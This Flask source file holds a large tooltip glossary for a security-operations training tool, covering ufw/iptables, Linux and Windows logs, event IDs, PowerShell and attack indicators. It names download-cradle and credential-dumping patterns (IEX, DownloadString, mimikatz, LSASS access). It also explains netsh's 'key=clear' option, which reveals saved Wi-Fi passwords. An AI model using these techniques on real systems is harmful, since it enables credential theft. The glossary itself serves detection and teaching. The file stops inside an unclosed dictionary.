from flask import Flask, render_template, request

app = Flask(__name__)

# ==================================================================
#  UNIVERSAL TOOLTIP GLOSSARY
# ==================================================================
COMMAND_TOOLTIPS = {
    # ---------- privilege / shell ----------
    "sudo": "Run the following command as root. Requires your password (or NOPASSWD in sudoers).",
    "apt": "Package manager on Debian/Ubuntu. 'apt update' refreshes indexes; 'apt install' installs a package.",
    "install": "Install a new package from the configured repositories.",
    "update": "Refresh the list of available packages from mirrors.",
    "upgrade": "Upgrade all installed packages to the newest version.",
    "systemctl": "Control the systemd service manager — start/stop/enable/status.",
    "start": "Start the service or process.",
    "stop": "Stop the service or process.",
    "restart": "Stop, then start the service.",
    "status": "Show current state and recent logs.",
    "enable": "Make the service start automatically at boot.",
    "disable": "Prevent the service from starting at boot.",

    # ---------- ufw ----------
    "ufw": "Uncomplicated Firewall — Ubuntu's friendly wrapper around iptables.",
    "default": "Set the fallback policy applied when no specific rule matches.",
    "deny": "Silently DROP matching traffic. No reply is sent to the sender.",
    "allow": "ACCEPT matching traffic — packets pass through the firewall.",
    "reject": "Discard and send an ICMP error back. Reveals the firewall.",
    "limit": "Rate-limit: block an IP for 30s if it makes >6 connections in 30s.",
    "logging": "Enable/disable writing blocked packets to /var/log/ufw.log.",
    "on": "Turn the feature on.",
    "off": "Turn the feature off.",
    "verbose": "Add extra detail: logging level, default policies, protocol.",
    "reset": "Remove every custom rule and restore UFW to its default state.",
    "delete": "Remove an existing rule from the active ruleset.",
    "incoming": "Traffic arriving at this machine from outside.",
    "outgoing": "Traffic leaving this machine toward another host.",
    "ssh": "Secure Shell. Service name maps to TCP port 22 in /etc/services.",
    "from": "Match packets based on source IP or subnet.",
    "to": "Match packets based on destination port.",
    "any": "Wildcard — matches any port, protocol, or address.",
    "port": "Target port number on the destination host.",
    "22": "Default SSH port. Target of most automated attacks on the internet.",
    "80/tcp": "HTTP — plain unencrypted web traffic.",
    "443/tcp": "HTTPS — encrypted web traffic using TLS.",
    "3306/tcp": "MySQL database port. NEVER expose this to the public internet.",
    "192.168.1.0/24": "CIDR notation — every IP from 192.168.1.0 to 192.168.1.255.",
    "192.168.1.50": "A specific trusted host. Example: your jump box or VPN gateway.",
    "203.0.113.5": "Example attacker IP. Silently dropped by the deny rule.",

    # ---------- iptables ----------
    "iptables": "The kernel's actual packet filter. UFW is a friendly frontend for it.",
    "netfilter-persistent": "Utility that saves/restores iptables rules across reboots.",
    "-L": "List all rules in the selected chain.",
    "-n": "Numeric output — show IPs/ports as numbers, skip DNS resolution.",
    "-v": "Verbose — include packet and byte counters per rule.",
    "-A": "Append a rule to the end of the chain.",
    "-I": "Insert a rule at a specific position (default: top).",
    "-D": "Delete a rule by number or by exact match.",
    "-P": "Set the default policy for a built-in chain (ACCEPT/DROP).",
    "-F": "Flush — delete every rule in every chain. DANGEROUS remotely.",
    "-j": "Jump — what to do when the rule matches (ACCEPT/DROP/LOG/REJECT).",
    "-i": "Input interface. 'lo' = loopback; 'eth0' = ethernet; 'wlan0' = wifi.",
    "-o": "Output interface — used for FORWARD and OUTPUT chains.",
    "-s": "Source IP or subnet to match.",
    "-d": "Destination IP or subnet to match.",
    "-p": "Protocol — tcp, udp, icmp, etc.",
    "-m": "Load an extension module (state, conntrack, recent, etc.).",
    "--dport": "Destination port to match (requires -p tcp or -p udp).",
    "--sport": "Source port to match.",
    "--state": "Match by connection state: NEW, ESTABLISHED, RELATED, INVALID.",
    "--update": "Update the recent-list entry for this IP.",
    "--seconds": "Time window for the recent-list check.",
    "--hitcount": "Number of hits within the window that triggers the rule.",
    "--log-prefix": "Text prepended to each log line for easy grepping in syslog.",
    "--ctstate": "Modern alias for --state (conntrack module).",
    "INPUT": "Chain for packets destined for THIS machine.",
    "OUTPUT": "Chain for packets originating FROM this machine.",
    "FORWARD": "Chain for packets routed THROUGH this machine (routers/firewalls).",
    "ACCEPT": "Let the packet through to the next stage.",
    "DROP": "Silently discard — no reply, sender sees only a timeout.",
    "REJECT": "Discard + send back an ICMP error. Polite but reveals the firewall.",
    "LOG": "Write a log entry, then continue to the next rule (doesn't stop).",
    "lo": "Loopback interface (127.0.0.1). Local traffic between processes.",
    "state": "Legacy module for connection state matching.",
    "conntrack": "Modern connection tracking module.",
    "ESTABLISHED,RELATED": "Allow reply packets of connections we already started.",
    "NEW": "Match only the FIRST packet of a new connection (not replies).",
    "recent": "Track recent connection attempts per IP — used for rate limiting.",

    # ---------- shell & text processing ----------
    "grep": "Search text. Prints lines matching a pattern.",
    "-i": "Case-insensitive match.",
    "-r": "Recursive search through directories.",
    "Failed password": "The exact string sshd writes on each failed login.",
    "Accepted": "The string sshd writes on successful login. Used to detect compromise.",
    "awk": "Text-processing language. Splits each line into fields and runs a small program per line.",
    "{print $(NF-3)}": "Print the 3rd field from the END. In sshd lines, that's the source IP.",
    "NF": "Number of Fields in awk — the total count of whitespace-separated columns.",
    "sort": "Sort lines alphabetically (or numerically with -n).",
    "uniq": "Collapse adjacent duplicate lines; -c prefixes each with its count.",
    "head": "Show only the first lines (default 10).",
    "tail": "Show only the last lines (default 10); -f follows in real time.",
    "wc": "Word count. -l counts lines.",
    "-rn": "Reverse numeric sort — biggest numbers first.",
    "|": "Pipe — send the output of one command into the next.",
    "sort -rn": "Reverse numeric sort — biggest numbers first.",

    # ---------- logs: general ----------
    "log": "A timestamped record of an event — what happened, when, and who caused it.",
    "syslog": "Standard protocol + format for sending logs to a central collector.",
    "rsyslog": "The daemon that collects, filters, and writes logs on Linux.",
    "journald": "systemd's binary log collector. Queried with journalctl.",
    "journalctl": "Query the systemd journal. Filter by unit, time, priority.",
    "-f": "Follow — keep the file open and print new lines as they arrive.",
    "-n": "Number of lines. Example: -n 50 shows the last 50 lines.",
    "cat": "Print the entire file to stdout. Good for short files.",
    "less": "Pager — scroll through a file one screen at a time.",
    "-l": "Count lines instead of words.",
    "zcat": "Decompress and print a .gz file to stdout.",
    "zgrep": "Search inside a .gz compressed log file.",
    "logrotate": "Scheduled rotation of log files — compresses old logs to save space.",
    "logger": "Send a test message to syslog from the command line.",
    "lastb": "Show failed logins from /var/log/btmp.",
    "last": "Show recent successful logins from /var/log/wtmp.",
    "who": "Show who is currently logged in.",
    "w": "Show logged-in users and what they are doing.",
    "dmesg": "Print the kernel ring buffer.",
    "-T": "Show human-readable timestamps instead of seconds-since-boot.",
    "auditctl": "Add, list, or delete auditd rules.",
    "ausearch": "Search the audit log with filters (by key, user, time).",
    "aureport": "Summarize audit log data as reports.",
    "logwatch": "Generate a daily summary report of interesting log events.",
    "goaccess": "Real-time web log analyzer with an HTML dashboard.",
    "lnav": "Interactive log file navigator with SQL query support.",
    "multitail": "Watch multiple log files side-by-side in one terminal.",

    # ---------- logs: Linux paths ----------
    "/var/log/": "Standard parent directory for log files on Linux.",
    "/var/log/syslog": "General system log: services, cron, kernel events, applications.",
    "/var/log/messages": "RHEL/CentOS equivalent of syslog for general system events.",
    "/var/log/auth.log": "Authentication events: SSH logins, sudo, su, PAM.",
    "/var/log/secure": "RHEL/CentOS equivalent of auth.log.",
    "/var/log/kern.log": "Kernel messages: drivers, hardware, iptables LOG rules.",
    "/var/log/cron": "Every scheduled cron job execution.",
    "/var/log/faillog": "Failed login attempts summary from PAM.",
    "/var/log/wtmp": "Binary log of every login/logout and reboot.",
    "/var/log/btmp": "Binary log of every failed login. Read with 'lastb'.",
    "/var/log/utmp": "Binary log of currently-logged-in users. Read with 'who'.",
    "/var/log/ufw.log": "Every packet allowed/blocked by UFW when logging is on.",
    "/var/log/fail2ban.log": "Bans and unbans issued by fail2ban.",
    "/var/log/audit/audit.log": "Kernel-level audit trail from auditd.",
    "/var/log/dpkg.log": "Every package installed, upgraded, or removed via dpkg/apt.",
    "/var/log/apache2/access.log": "Every HTTP request to Apache — IP, URL, status, UA.",
    "/var/log/apache2/error.log": "Apache errors, PHP warnings, permission denials.",
    "/var/log/nginx/access.log": "Every HTTP request to Nginx.",
    "/var/log/nginx/error.log": "Nginx errors and upstream failures.",
    "/var/log/mysql/error.log": "MySQL server startup, crashes, and query errors.",
    "/var/log/mail.log": "Postfix/Sendmail delivery events.",

    # ---------- logs: Windows Event Viewer ----------
    "Event Viewer": "GUI tool to browse Windows event logs.",
    "eventvwr.msc": "Command to launch Windows Event Viewer.",
    "Get-WinEvent": "PowerShell cmdlet to query Windows event logs.",
    "Get-EventLog": "Legacy PowerShell cmdlet for event logs (deprecated).",
    "-FilterHashtable": "Get-WinEvent parameter to filter by log name, ID, time, level.",
    "MaxEvents": "Limit the number of events returned by Get-WinEvent.",
    "Where-Object": "Filter pipeline objects by a condition.",
    "Select-Object": "Pick specific columns from pipeline output.",
    "Group-Object": "Group objects by a property value.",
    "Sort-Object": "Sort objects by a property.",
    "wevtutil": "Command-line tool to query and manage Windows event logs.",
    "wevtutil qe": "Query events from a specific log with an XPath filter.",
    "Get-Content": "Read a file's contents — PowerShell equivalent of 'cat'.",
    "-Wait": "Keep the file open and stream new lines (like tail -f).",
    "-Tail": "Show only the last N lines of a file.",
    "C:\\Windows\\System32\\winevt\\Logs\\": "Directory containing all .evtx event log files on Windows.",
    "winevt": "Windows event log folder. Contains .evtx files.",
    ".evtx": "Windows XML event log file format — binary, readable by Event Viewer.",

    # ---------- logs: Windows channels ----------
    "System": "Windows log channel for OS events: drivers, services, shutdowns.",
    "Application": "Windows log channel for user applications and installers.",
    "Security": "Windows log channel for logons, privilege use, audit events.",
    "Setup": "Windows log channel for OS install/upgrade events.",
    "ForwardedEvents": "Windows log channel receiving events from remote machines.",
    "Microsoft-Windows-PowerShell/Operational": "PowerShell script blocks and pipeline activity.",
    "Microsoft-Windows-Sysmon/Operational": "Sysmon events (process, network, file, DNS).",
    "Microsoft-Windows-TaskScheduler/Operational": "Scheduled task creation and execution.",
    "Microsoft-Windows-Windows Defender/Operational": "Defender antivirus detections.",

    # ---------- logs: Windows Event IDs ----------
    "1000": "Application error — a program crashed.",
    "1001": "Windows Error Reporting — crash details.",
    "104": "System log cleared.",
    "1074": "Shutdown/restart initiated by user or process.",
    "6005": "Event Log service started — system boot.",
    "6006": "Event Log service stopped — clean shutdown.",
    "6008": "Unexpected shutdown — power loss or crash.",
    "7034": "Service crashed unexpectedly.",
    "7036": "Service state changed (started/stopped).",
    "7040": "Service start type changed.",
    "7045": "New service installed — persistence indicator.",
    "1102": "Security log cleared — always suspicious.",
    "4624": "Successful logon.",
    "4625": "Failed logon — brute force indicator if repeated.",
    "4634": "Logoff.",
    "4647": "User initiated logoff.",
    "4648": "Logon with explicit credentials (runas-style).",
    "4672": "Special privileges assigned to new logon.",
    "4688": "Process created — requires command-line auditing.",
    "4689": "Process exited.",
    "4697": "Service installed (Security channel).",
    "4698": "Scheduled task created.",
    "4702": "Scheduled task updated.",
    "4719": "Audit policy changed.",
    "4720": "User account created.",
    "4726": "User account deleted.",
    "4732": "Member added to local group.",
    "4740": "Account locked out.",
    "4768": "Kerberos TGT requested.",
    "4769": "Kerberos service ticket requested.",
    "4771": "Kerberos pre-auth failed.",
    "4776": "NTLM authentication attempt.",
    "5140": "Network share accessed.",
    "5156": "Network connection allowed by Windows Filtering Platform.",
    "5157": "Network connection blocked by Windows Filtering Platform.",
    "4103": "PowerShell module logging.",
    "4104": "PowerShell script block — captures deobfuscated scripts.",
    "1": "Sysmon: process created.",
    "3": "Sysmon: network connection.",
    "8": "Sysmon: CreateRemoteThread — code injection indicator.",
    "10": "Sysmon: process access (LSASS access = credential theft).",
    "11": "Sysmon: file created.",
    "22": "Sysmon: DNS query.",
    "Sysmon": "System Monitor — Windows service that logs process, network, and file activity.",

    # ---------- Splunk ----------
    "splunk": "Splunk Enterprise — SIEM that indexes and searches logs.",
    "splunkforwarder": "Splunk Universal Forwarder — lightweight log shipper.",
    "index=": "Splunk search term: restrict to a named index.",
    "sourcetype=": "Splunk search term: restrict to a specific log format.",
    "stats": "Splunk command: calculate aggregate statistics.",
    "count": "Splunk function: number of matching events.",
    "by": "Splunk command modifier: group by a field.",
    "where": "Splunk command: filter results by a condition.",
    "search": "Splunk command: the base search command.",
    "timechart": "Splunk command: aggregate over time.",
    "dedup": "Splunk command: remove duplicate events.",
    "table": "Splunk command: format results as a table.",

    # ---------- IoT / protocols ----------
    "mqtt": "Message Queuing Telemetry Transport — lightweight pub/sub protocol.",
    "coap": "Constrained Application Protocol — RESTful protocol for IoT over UDP.",
    "modbus": "Industrial control protocol used by PLCs and SCADA systems.",
    "zigbee": "Low-power mesh protocol for home automation and industrial IoT.",
    "lorawan": "Long-range, low-power WAN protocol for battery-powered sensors.",
    "ble": "Bluetooth Low Energy — short-range communication for wearables.",

    # ---------- generic ----------
    "IP": "IP address — numeric label assigned to a network interface.",
    "API": "Application Programming Interface — how programs talk to each other.",
    "SOC": "Security Operations Center — team + tools that monitor and defend a network.",
    "SIEM": "Security Information and Event Management — central log + alert platform.",
    "IOC": "Indicator of Compromise — evidence that a system has been breached.",

        # ============================================================
    # POWERSHELL — CMDLETS
    # ============================================================
    "Get-Help": "Show built-in help for any cmdlet: syntax, parameters, examples.",
    "Get-Command": "Discover cmdlets, functions, aliases. Filter with -Noun or -Verb.",
    "Get-Process": "List running processes with CPU, memory, path. Pipe to Sort/Where.",
    "Start-Process": "Launch a new process from PowerShell with full control over arguments.",
    "Stop-Process": "Terminate one or more running processes by name or PID.",
    "Get-Service": "List Windows services with their state (Running/Stopped).",
    "Start-Service": "Start a stopped Windows service.",
    "Stop-Service": "Stop a running Windows service.",
    "Restart-Service": "Stop, then start a Windows service — useful after config changes.",
    "Get-ScheduledTask": "List scheduled tasks with name, path, state.",
    "Get-ScheduledTaskInfo": "Show last run time, last result, and next run for a task.",
    "Get-CimInstance": "Query WMI/CIM classes — the modern alternative to Get-WmiObject.",
    "Win32_Process": "WMI class containing every running process, including full command line.",
    "Win32_Service": "WMI class containing every Windows service and its executable path.",
    "Win32_StartupCommand": "WMI class aggregating all autorun locations: Run keys, Startup folder.",
    "Get-WinEvent": "Query Windows Event Log. Fast when combined with -FilterHashtable.",
    "Get-EventLog": "Legacy cmdlet for classic Event Logs (Application, System, Security).",
    "Get-FileHash": "Compute SHA256/MD5/SHA1 hash of a file for IOC lookups.",
    "Get-AuthenticodeSignature": "Check if an executable is signed by a trusted publisher.",
    "Get-NetTCPConnection": "List TCP connections with state, local/remote IP, owning PID.",
    "Get-NetUDPEndpoint": "List UDP endpoints — useful for spotting covert channels.",
    "Get-NetFirewallRule": "List Windows Firewall rules.",
    "New-NetFirewallRule": "Create a new Windows Firewall rule — block an attacker instantly.",
    "Get-DnsClientCache": "Show the local DNS resolver cache — spot C2 domains.",
    "Get-ChildItem": "List files and folders (like ls or dir). -Recurse walks subdirectories.",
    "Get-Content": "Read file contents (like cat). -Wait follows live; -Tail shows the last N lines.",
    "Get-Item": "Return metadata for a file, folder, or registry key.",
    "Get-ItemProperty": "Read a registry key's values or a file's properties.",
    "Select-Object": "Pick specific properties from pipeline objects, or limit rows with -First/-Last.",
    "Where-Object": "Filter pipeline objects by a condition (like SQL WHERE).",
    "Sort-Object": "Sort pipeline objects by one or more properties.",
    "Group-Object": "Group objects by a property value — the foundation of counting.",
    "ForEach-Object": "Run a script block for each object in the pipeline (like a loop).",
    "Measure-Object": "Count, sum, average, min, max of pipeline values.",
    "Format-List": "Display objects as a vertical list — useful for wide output.",
    "Format-Table": "Display objects as a table — default for most cmdlets.",
    "Out-File": "Write pipeline output to a file.",
    "Export-Csv": "Export objects to CSV for SIEM ingestion or Excel analysis.",
    "ConvertTo-Json": "Serialize pipeline output as JSON — great for structured logging.",
    "ConvertFrom-Json": "Parse a JSON string into PowerShell objects.",
    "Import-Csv": "Read a CSV file into PowerShell objects.",
    "Invoke-Command": "Run a command on local or remote machines.",
    "Invoke-WebRequest": "Fetch a web page or API — PowerShell's curl equivalent.",
    "Invoke-RestMethod": "Call a REST API and parse JSON/XML automatically.",
    "Test-Connection": "Ping a host from PowerShell (like ping, but returns objects).",
    "Test-Path": "Check if a file, folder, or registry key exists.",
    "Resolve-DnsName": "Query DNS for a name — forward, reverse, or specific record types.",

    # ============================================================
    # POWERSHELL — COMMON PARAMETERS
    # ============================================================
    "-FilterHashtable": "Get-WinEvent parameter: filter event logs by LogName, ID, StartTime, Level.",
    "-MaxEvents": "Limit the number of events returned — prevents loading millions.",
    "-LogName": "Specify which Windows log channel to query (Security, System, Application).",
    "-ComputerName": "Target a remote computer for the cmdlet.",
    "-Credential": "Provide alternate credentials (username + password) for the operation.",
    "-Verbose": "Show extra detail during execution — useful when debugging.",
    "-ErrorAction": "Control error behavior. SilentlyContinue suppresses errors.",
    "-Force": "Bypass confirmation prompts or overwrite existing objects.",
    "-Recurse": "Walk into subfolders when listing files.",
    "-Path": "File or registry path to operate on.",
    "-FilePath": "Specific file path for cmdlets that take a file argument.",
    "-Name": "Filter by name — process name, service name, task name.",
    "-Id": "Filter by identifier — process ID, event ID, rule ID.",
    "-Algorithm": "Hash algorithm for Get-FileHash: SHA256, SHA1, MD5.",
    "-Property": "Property to filter, sort, or group by.",
    "-First": "Limit output to the first N items.",
    "-Last": "Limit output to the last N items.",
    "-Descending": "Reverse the sort order (largest first).",
    "-State": "Connection or service state: Established, Listening, Running, Stopped.",
    "-DisplayName": "Human-readable name for a service, task, or firewall rule.",
    "-TaskPath": "Folder path within Task Scheduler (e.g., '\\\\Microsoft\\\\').",
    "-TaskName": "Name of a scheduled task.",

    # ============================================================
    # POWERSHELL — EVENT IDs
    # ============================================================
    "4625": "Failed logon — repeated entries from one IP = brute force.",
    "4624": "Successful logon — logon type reveals HOW the user authenticated.",
    "4688": "Process created — requires command-line auditing to show arguments.",
    "4732": "Member added to local security group — privilege escalation indicator.",
    "4728": "Member added to global security group — domain privilege escalation.",
    "4662": "Directory service access — DCSync uses this for replication abuse.",
    "4769": "Kerberos service ticket requested — filter for RC4 to detect Kerberoasting.",
    "4768": "Kerberos TGT requested — anomalies indicate credential attacks.",
    "4771": "Kerberos pre-auth failed — password spraying indicator.",
    "4740": "Account locked out — pattern reveals password guessing.",
    "1102": "Security log cleared — ALWAYS investigate. No legitimate reason.",
    "4103": "PowerShell module logging — every cmdlet invoked.",
    "4104": "PowerShell script block — deobfuscated script content. Best PS log.",
    "5156": "Network connection allowed by WFP.",
    "5157": "Network connection blocked by WFP.",
    "7045": "Service installed — persistence indicator.",

    # ============================================================
    # POWERSHELL — LOGON TYPES
    # ============================================================
    "LogonType": "Field in Event 4624 that tells you HOW the logon occurred.",
    "Type 2": "Interactive logon — user at physical keyboard.",
    "Type 3": "Network logon — SMB, printer shares, mapped drives.",
    "Type 4": "Batch logon — scheduled tasks running as a user.",
    "Type 5": "Service logon — services starting under an account.",
    "Type 7": "Unlock — workstation unlocked.",
    "Type 8": "NetworkCleartext — credentials sent in plaintext (rare, suspicious).",
    "Type 9": "NewCredentials — runas /netonly.",
    "Type 10": "RemoteInteractive — RDP. Unusual IPs here = lateral movement.",
    "Type 11": "CachedInteractive — logon with cached credentials (offline).",

    # ============================================================
    # POWERSHELL — PROPERTIES & OBJECTS
    # ============================================================
    "$_": "The current object in the pipeline — used inside Where-Object and ForEach-Object.",
    "Properties[5]": "Field index in a Windows event. For 4625/4624 = target username.",
    "Properties[8]": "Event 4624: logon type (2, 3, 10, etc.).",
    "Properties[18]": "Event 4624: source IP address of the logon.",
    "Properties[2]": "Sysmon Event 10: source image (process accessing LSASS).",
    "Properties[6]": "Sysmon Event 10: granted access mask.",
    "GrantedAccess": "Permission mask requested by a process. 0x1410 = read+write to LSASS.",
    "OwningProcess": "Get-NetTCPConnection field: PID of the process owning the socket.",
    "RemoteAddress": "Destination IP for a TCP connection.",
    "RemotePort": "Destination port — 443 HTTPS, 8080 HTTP-alt, 4444 C2.",
    "LocalAddress": "Local IP the connection is bound to.",
    "LocalPort": "Local port — ephemeral for outbound, fixed for listeners.",
    "PSCustomObject": "Type accelerator to build a custom object from a hashtable.",
    "Calculated": "Calculated property: @{N='Name';E={expression}} builds a field on the fly.",
    "[PSCustomObject]": "Cast a hashtable into an object with named properties.",
    "@{N=...;E=...}": "Calculated property syntax inside Select-Object.",

    # ============================================================
    # POWERSHELL — REGEX
    # ============================================================
    "-match": "Regex match operator — supports patterns like 'lsass\\.exe'.",
    "-notmatch": "Negated regex match — excludes matching objects.",
    "-like": "Wildcard match (uses * and ?).",
    "-notlike": "Negated wildcard match.",
    "EncodedCommand": "Base64-encoded PowerShell command — classic obfuscation.",
    "FromBase64String": "Decode Base64 — used to hide payloads in scripts.",
    "IEX": "Invoke-Expression — executes a string as code. High-risk in logs.",
    "Invoke-Expression": "Executes a string as PowerShell code. Attacker favorite.",
    "DownloadString": "Fetches a URL into memory — the classic download cradle.",
    "DownloadFile": "Fetches a URL and writes to disk.",

    # ============================================================
    # POWERSHELL — AUTH & ATTACK PATTERNS
    # ============================================================
    "lsass.exe": "Local Security Authority — holds password hashes in memory.",
    "lsass": "Short form of lsass.exe — used in regex filters for credential theft.",
    "mimikatz.exe": "The classic credential dumping tool. Always malicious on a workstation.",
    "Kerberoasting": "Attack that requests RC4 service tickets for offline cracking.",
    "DCSync": "Attack that impersonates a DC to pull password hashes from AD.",
    "0x17": "Kerberos RC4-HMAC encryption type — weak, used in Kerberoasting.",
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes GUID (DCSync).",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All GUID (DCSync).",
    "rundll32.exe": "Legitimate Windows utility. Running from Public/Temp = malware.",
    "svchost.exe": "Windows service host. Running from Public/Temp = malware masquerading.",
    "pwsh": "PowerShell 7+ executable name. Difference from powershell.exe matters.",
    "powershell.exe": "Windows PowerShell 5.1 — present on every Windows system.",
    "cmd.exe": "Command Prompt. Attackers use 'cmd /c' for quick commands.",
    "wscript": "Windows Script Host — runs .vbs/.js. Common malware dropper.",
    "cscript": "Console version of wscript — same risk.",
    "mshta": "Runs HTML Applications — abused for LOLBin execution.",
    "notepad.exe": "Legitimate text editor. Suspicious when spawning cmd or PS.",
    "excel.exe": "Office macro abuse often spawns cmd/powershell from Excel.",
    "winword.exe": "Word macros commonly used to drop malware.",

        # ============================================================
    # WINDOWS EVENT LOGS — CMDLETS
    # ============================================================
    "wevtutil": "Windows Events Utility — command-line tool to query, export, and clear event logs.",
    "wevtutil el": "Enumerate every event log channel on the system.",
    "wevtutil qe": "Query events from a specific channel. Add /f:text /c:10 for readable output of 10 events.",
    "wevtutil epl": "Export the entire log channel to a .evtx file for offline analysis.",
    "eventvwr.msc": "Launch the Windows Event Viewer GUI — the classic tool for browsing logs.",
    "Get-EventLog": "Legacy PowerShell cmdlet for classic Event Logs. Superseded by Get-WinEvent.",
    "Get-MpScan": "Start a Windows Defender malware scan.",
    "Start-MpScan": "Start a Windows Defender malware scan. -ScanType QuickScan or FullScan.",
    "-ScanType": "Get-MpScan/Start-MpScan parameter: QuickScan (5-10 min) or FullScan (hours).",
    "QuickScan": "Fast Defender scan — checks memory, startup locations, common malware paths.",
    "FullScan": "Exhaustive Defender scan — checks every file on every drive. Takes hours.",
    "Get-MpThreatDetection": "List every malware detection from Defender with threat name and file path.",
    "Get-MpComputerStatus": "Show Defender status — signature version, last scan times, real-time protection.",
    "netsh": "Network Shell — configure and query every network stack on Windows.",
    "wlan": "The netsh subcommand for wireless (Wi-Fi) management.",
    "show profiles": "List every Wi-Fi profile saved on this machine.",
    "key=clear": "Tell netsh to display the Wi-Fi password in plaintext instead of hiding it.",
    "Key Content": "The field name in netsh output that contains the Wi-Fi password.",
    "findstr": "Grep for Windows. Search text in files or pipe output.",
    "/C:": "findstr flag: search for the literal string that follows.",

    # ============================================================
    # WINDOWS EVENT LOGS — CHANNELS
    # ============================================================
    "LogName": "Which log channel — Security, System, Application, Setup, ForwardedEvents.",
    "Security": "Windows log channel: logons, privilege use, audit events.",
    "System": "Windows log channel: OS events, driver loads, service start/stop.",
    "Application": "Windows log channel: user applications, installers, crashes.",
    "Setup": "Windows log channel: OS install/upgrade events.",
    "ForwardedEvents": "Windows log channel that receives events from remote machines via WEF.",
    "Microsoft-Windows-Sysmon/Operational": "Sysmon event channel — process, network, file, DNS events.",
    "Microsoft-Windows-PowerShell/Operational": "PowerShell script block and pipeline logging.",
    "Microsoft-Windows-Windows Defender/Operational": "Defender AV detections and scans.",
    "Microsoft-Windows-TaskScheduler/Operational": "Scheduled task creation and execution.",
    ".evtx": "Windows XML Event Log file format — binary, readable by Event Viewer or wevtutil.",

    # ============================================================
    # WINDOWS EVENT IDs — AUTHENTICATION
    # ============================================================
    "4624": "Successful logon — every time a user logs in, this event records how, from where, and with what logon type.",
    "4625": "Failed logon — WRONG password, unknown user, or disabled account. Repeated entries from one IP = brute force.",
    "4634": "Logoff — session ended cleanly.",
    "4647": "User initiated logoff — user clicked 'Log off' or closed session.",
    "4648": "Logon with explicit credentials — runas, net use with different creds. Rare and highly suspicious.",
    "4672": "Special privileges assigned to new logon — fires when admin-level account logs in.",
    "4776": "NTLM authentication attempt — legacy auth protocol. Anomalies indicate credential attacks.",

    # ============================================================
    # WINDOWS EVENT IDs — KERBEROS
    # ============================================================
    "4768": "Kerberos TGT requested — the initial ticket a user gets when logging into a domain.",
    "4769": "Kerberos service ticket requested — user wants access to a service (file share, SQL, etc.).",
    "4771": "Kerberos pre-authentication failed — bad password for a domain account. Password spray signal.",
    "TGT": "Ticket Granting Ticket — Kerberos credential that proves your identity to the domain.",
    "TGS": "Ticket Granting Service — Kerberos ticket that grants access to a specific service.",
    "Kerberoasting": "Attack that requests service tickets and cracks them offline. Detected via 4769 with RC4 encryption.",
    "DCSync": "Attack that impersonates a domain controller to pull password hashes. Detected via 4662 with DS-Replication GUIDs.",

    # ============================================================
    # WINDOWS EVENT IDs — PERSISTENCE
    # ============================================================
    "4697": "Service installed (Security channel) — mirrored from System 7045.",
    "4698": "Scheduled task created — common persistence mechanism.",
    "4702": "Scheduled task updated — task modified after creation.",
    "4720": "User account created — new account added to the system.",
    "4726": "User account deleted.",
    "4728": "Member added to a global security group — domain-level privilege change.",
    "4732": "Member added to a local security group — privilege escalation indicator.",
    "4740": "Account locked out — the result of repeated failed logons.",
    "7045": "Service installed (System channel) — attackers use services for persistence. Check ImagePath.",

    # ============================================================
    # WINDOWS EVENT IDs — EXECUTION / DEFENSE
    # ============================================================
    "4688": "Process created — requires command-line auditing to show the full command. Reveals attacker execution.",
    "4689": "Process exited.",
    "4103": "PowerShell module logging — every cmdlet invoked.",
    "4104": "PowerShell script block — deobfuscated script content. Best PS detection event.",
    "1102": "Security log cleared — NO legitimate reason. Always an active incident.",
    "104": "System log cleared — often part of defense evasion.",
    "6005": "Event Log service started — system boot.",
    "6006": "Event Log service stopped — clean shutdown.",
    "6008": "Unexpected shutdown — power loss or crash.",

    # ============================================================
    # WINDOWS EVENT IDs — SYSmon
    # ============================================================
    "1": "Sysmon Event 1 — process created. Full command line, parent, hashes.",
    "3": "Sysmon Event 3 — network connection. Records which process connected to which IP.",
    "8": "Sysmon Event 8 — CreateRemoteThread. Code injection detection.",
    "10": "Sysmon Event 10 — process access. LSASS access here = credential theft.",
    "11": "Sysmon Event 11 — file created. Catches dropped payloads and ransomware.",
    "22": "Sysmon Event 22 — DNS query. Detects C2 domains and beaconing.",
    "Sysmon": "System Monitor — Sysinternals tool that logs high-fidelity Windows activity.",
    "sysmon": "System Monitor executable.",
    "sysmon -i": "Install Sysmon as a service with driver.",
    "sysmon -c": "Apply a config file to control what Sysmon logs.",

    # ============================================================
    # LOGON TYPES — THE BIG ONE
    # ============================================================
    "LogonType": "Field in Event 4624 that tells you HOW the logon happened. Numbers 2-11 each mean something different.",
    "Logon Type": "How the user authenticated — interactive, network, service, RDP, etc. Critical for spotting anomalies.",
    "Type 2": "INTERACTIVE logon — user typed credentials at a physical keyboard (console session).",
    "Type 3": "NETWORK logon — user authenticated over the network to access a share or resource. Passwords are NOT cached locally.",
    "Type 4": "BATCH logon — a scheduled task ran under a user account.",
    "Type 5": "SERVICE logon — a Windows service started and runs as that account.",
    "Type 7": "UNLOCK logon — user unlocked their workstation with a password.",
    "Type 8": "NETWORK CLEARTEXT logon — credentials sent in plaintext. Rare and suspicious.",
    "Type 9": "NEW CREDENTIALS logon — runas /netonly. Local session is normal but network auth uses different creds.",
    "Type 10": "REMOTE INTERACTIVE — RDP. Same as being at the physical console but over the network. Anomalous IPs here = lateral movement or unauthorized remote access.",
    "Type 11": "CACHED INTERACTIVE — user logged in with cached credentials because the DC was unreachable. Common on laptops.",
    "Properties[8]": "In Event 4624, this field holds the LogonType number (2-11).",
    "Properties[5]": "In Events 4624/4625, this field holds the TargetUserName (who was logging in).",
    "Properties[18]": "In Event 4624, this field holds the source IP address the logon came from.",

    # ============================================================
    # WINDOWS CREDENTIAL STORES
    # ============================================================
    "LSASS": "Local Security Authority Subsystem Service — holds password hashes, Kerberos tickets, and cached credentials in memory.",
    "lsass.exe": "The LSASS process — the #1 target for credential dumping (Mimikatz, ProcDump).",
    "SAM": "Security Account Manager — database of local user password hashes, stored at C:\\Windows\\System32\\config\\SAM.",
    "NTDS.dit": "Active Directory database — holds every domain user's password hash. Located on domain controllers.",
    "Credential Guard": "Windows feature that isolates LSASS in a virtualized container to prevent credential dumping.",
    "NTLM": "Legacy Windows authentication protocol. Uses password hashes, vulnerable to relay attacks.",
    "Kerberos": "Modern Windows authentication protocol. Uses tickets instead of passwords.",
    "Mimikatz": "The classic credential dumping tool. Reads LSASS memory to extract passwords and hashes.",
    "mimikatz.exe": "Executable for Mimikatz. Always malicious on a workstation.",

    # ============================================================
    # WINDOWS CONCEPTS
    # ============================================================
